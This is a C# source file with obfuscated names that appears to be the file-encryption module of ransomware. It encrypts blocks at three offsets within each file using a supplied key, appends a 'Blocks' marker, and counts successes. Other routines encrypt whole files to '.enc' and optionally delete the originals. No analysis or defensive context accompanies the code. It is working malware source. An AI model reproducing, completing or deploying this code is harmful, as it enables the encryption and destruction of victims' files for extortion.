using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using IlvDzAreHadiwY;

namespace vQzMGKHeycFziMq;

internal class dRHdGUnJfHhyVsbn
{
	public const int OCJiVXTzqhbm = 256;

	public static void bxbNscFTIwSIX(string eXWEAgUDpDuWJTS, int UDovKbHpuOA)
	{
		FileInfo fileInfo = new FileInfo(eXWEAgUDpDuWJTS);
		FileStream fileStream = fileInfo.Open(FileMode.Open);
		fileStream.SetLength(Math.Max(0L, fileInfo.Length - UDovKbHpuOA));
		fileStream.Close();
	}

	public static int rMomgcFCDKNFve(long rjKQdGsmSQcAf)
	{
		return (int)rjKQdGsmSQcAf;
	}

	public static bool OOezEpsxnEQlad(string iagXDjBgQJ, string sSZCkHrIlRCk, string RrAvDItbIaIQR, byte[] dmnYeGgeQmR = null, byte[] gufJYCIcMtiFoE = null)
	{
		try
		{
			using (FileStream fileStream = new FileStream(iagXDjBgQJ, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
			{
				int num = rMomgcFCDKNFve(fileStream.Length) / 3;
				if (num < 0)
				{
					num *= -1;
				}
				int num2 = 0;
				try
				{
					num2 = Convert.ToInt32(sSZCkHrIlRCk) * Convert.ToInt32(fileStream.Length) / 100 / 2;
					if (num2 < 0)
					{
						num2 *= -1;
					}
				}
				catch
				{
					num2 = 107374182;
				}
				if (num <= num2 - Convert.ToInt32(sSZCkHrIlRCk) * 1024 * 1024)
				{
					num2 = (num - Convert.ToInt32(sSZCkHrIlRCk) * 1024 * 1024) / 10;
				}
				int hRJRbqzLfWhTmon = (int)Math.Round((double)num2 / 32.0, MidpointRounding.AwayFromZero) * 32;
				byte[] array = null;
				for (int i = 0; i < 3; i++)
				{
					byte[] array2 = adGMhFHbujqlQq(iagXDjBgQJ, fileStream, hRJRbqzLfWhTmon, num * i);
					array = (yzZnBHwSsJOOcf.UZbqPEyevT ? CADchyJmisYEw.TMSpHRQaaiOBKQ(array2, Convert.FromBase64String(RrAvDItbIaIQR), gufJYCIcMtiFoE) : xPAIwPiUUms.eiKYzlcqJmBscwSj(array2, Convert.FromBase64String(RrAvDItbIaIQR), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }));
					rxamsjPpaKwavE(iagXDjBgQJ, fileStream, array, num * i);
				}
			}
			byte[] array3 = null;
			array3 = (yzZnBHwSsJOOcf.gIEIPYSAmb ? Encoding.ASCII.GetBytes(yzZnBHwSsJOOcf.jLGThbkXlozfB("QmxvY2tz") + yzZnBHwSsJOOcf.jLGThbkXlozfB("Kw==") + Convert.ToString(sSZCkHrIlRCk) + yzZnBHwSsJOOcf.jLGThbkXlozfB("Kw==")) : Encoding.ASCII.GetBytes(yzZnBHwSsJOOcf.jLGThbkXlozfB("QmxvY2tz") + yzZnBHwSsJOOcf.jLGThbkXlozfB("LQ==") + Convert.ToString(sSZCkHrIlRCk) + yzZnBHwSsJOOcf.jLGThbkXlozfB("LQ==")));
			if (!yzZnBHwSsJOOcf.gIEIPYSAmb)
			{
				using FileStream fileStream2 = new FileStream(iagXDjBgQJ, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream2.Write(array3, 0, array3.Length);
			}
			else
			{
				using FileStream fileStream3 = new FileStream(iagXDjBgQJ, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream3.Write(dmnYeGgeQmR, 0, dmnYeGgeQmR.Length);
				fileStream3.Write(array3, 0, array3.Length);
			}
		}
		catch (Exception ex)
		{
			if (yzZnBHwSsJOOcf.dwCcrxocWgDvY)
			{
				try
				{
					File.AppendAllText(yzZnBHwSsJOOcf.HXSuIBiFjcFlYv, "File: " + iagXDjBgQJ + " - Error creating filestream for block process or read-write: " + ex.Message + "\r\n");
				}
				catch (Exception)
				{
				}
			}
			yzZnBHwSsJOOcf.sasdvwkURzh++;
			return false;
		}
		yzZnBHwSsJOOcf.MkfVCujHefEQ++;
		return true;
	}

	public static string tGqoHYvyat(string mnzREoGOwwK)
	{
		byte[] bytes = Convert.FromBase64String(mnzREoGOwwK);
		return Encoding.UTF8.GetString(bytes);
	}

	public static byte[] mSOBnKyvJuAcOd(int eNIWSOvZBKMOVer)
	{
		byte[] array = new byte[eNIWSOvZBKMOVer];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		rNGCryptoServiceProvider.GetBytes(array);
		return array;
	}

	public static bool hvufjMAPFAZEK(string zVTOGftySifp, byte[] lkfTTdyztfHeXGp, bool wTxnkGHyYBlHD)
	{
		byte[] array = mSOBnKyvJuAcOd(16);
		using FileStream fileStream = new FileStream(zVTOGftySifp + ".enc", FileMode.Create);
		Rfc2898DeriveBytes rfc2898DeriveBytes = pVbzAANOAfxpprR(lkfTTdyztfHeXGp, array);
		lkfTTdyztfHeXGp = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.ISO10126;
		aes.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		using CryptoStream cryptoStream = new CryptoStream(fileStream, aes.CreateEncryptor(), CryptoStreamMode.Write);
		using FileStream fileStream2 = new FileStream(zVTOGftySifp, FileMode.Open);
		byte[] array2 = new byte[1];
		rfc2898DeriveBytes.Dispose();
		try
		{
			int count;
			while ((count = fileStream2.Read(array2, 0, array2.Length)) > 0)
			{
				cryptoStream.Write(array2, 0, count);
			}
			if (wTxnkGHyYBlHD)
			{
				File.Delete(zVTOGftySifp);
			}
			cryptoStream.Close();
			fileStream.Close();
			fileStream2.Close();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool MZHDFpAzJyCd(string sGLnFuGVItHRMzws, byte[] MStjLubwacF, bool guJyfFvtnSjDV)
	{
		byte[] array = new byte[16];
		using FileStream fileStream = new FileStream(sGLnFuGVItHRMzws, FileMode.Open);
		fileStream.Read(array, 0, array.Length);
		Rfc2898DeriveBytes rfc2898DeriveBytes = pVbzAANOAfxpprR(MStjLubwacF, array);
		MStjLubwacF = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.ISO10126;
		aes.Mode = CipherMode.CBC;
		using CryptoStream cryptoStream = new CryptoStream(fileStream, aes.CreateDecryptor(), CryptoStreamMode.Read);
		using FileStream fileStream2 = new FileStream(sGLnFuGVItHRMzws.Remove(sGLnFuGVItHRMzws.Length - 4), FileMode.Create);
		byte[] array2 = new byte[1];
		rfc2898DeriveBytes.Dispose();
		try
		{
			while (cryptoStream.Read(array2, 0, array2.Length) > 0)
			{
				fileStream2.Write(array2, 0, array2.Length);
			}
			cryptoStream.FlushFinalBlock();
			fileStream2.Close();
			fileStream.Close();
			cryptoStream.Close();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static byte[] JHBTowLJhfM(byte[] BwOeVxSCCDYfpT, byte[] PbPIPUzenzCD, byte[] tuMdDATIZVGj)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = pVbzAANOAfxpprR(PbPIPUzenzCD, tuMdDATIZVGj);
		PbPIPUzenzCD = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(BwOeVxSCCDYfpT, 0, BwOeVxSCCDYfpT.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static byte[] SaVwnhDFmLWey(byte[] JvaHFRCSvGE, byte[] gnLlVsyFTckLOFx, byte[] RlfecRXntdp)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = pVbzAANOAfxpprR(gnLlVsyFTckLOFx, RlfecRXntdp);
		gnLlVsyFTckLOFx = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(JvaHFRCSvGE, 0, JvaHFRCSvGE.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static bool vDaytqTZlwYgf(byte[] OoSbGsLOrqZoI, byte[] TtfXHcsKMAPg, byte[] dhGWjfDJXRYF)
	{
		using Rfc2898DeriveBytes rfc2898DeriveBytes = pVbzAANOAfxpprR(OoSbGsLOrqZoI, TtfXHcsKMAPg);
		byte[] bytes = rfc2898DeriveBytes.GetBytes(32);
		return bytes.SequenceEqual(dhGWjfDJXRYF);
	}

	public static Rfc2898DeriveBytes pVbzAANOAfxpprR(byte[] RlQTsJVxLDXmVrO, byte[] jRjvjeOdFZJRrIV)
	{
		return new Rfc2898DeriveBytes(RlQTsJVxLDXmVrO, jRjvjeOdFZJRrIV, 52768);
	}

	public static byte[] adGMhFHbujqlQq(string NskxtXSHxSNBsx, FileStream MkWIUMxdWsF, int hRJRbqzLfWhTmon, int OonLVCVVXyclRMy = 0)
	{
		byte[] array = new byte[hRJRbqzLfWhTmon];
		MkWIUMxdWsF.Position = OonLVCVVXyclRMy;
		MkWIUMxdWsF.Read(array, 0, hRJRbqzLfWhTmon);
		return array;
	}

	public static void rxamsjPpaKwavE(string NSpfeOgRUsac, FileStream LtXOGmtRuJZnaL, byte[] xQluvexUWov, int TgdCKXyuoFqpfEfP = 0)
	{
		LtXOGmtRuJZnaL.Position = TgdCKXyuoFqpfEfP;
		LtXOGmtRuJZnaL.Write(xQluvexUWov, 0, xQluvexUWov.Length);
	}
}
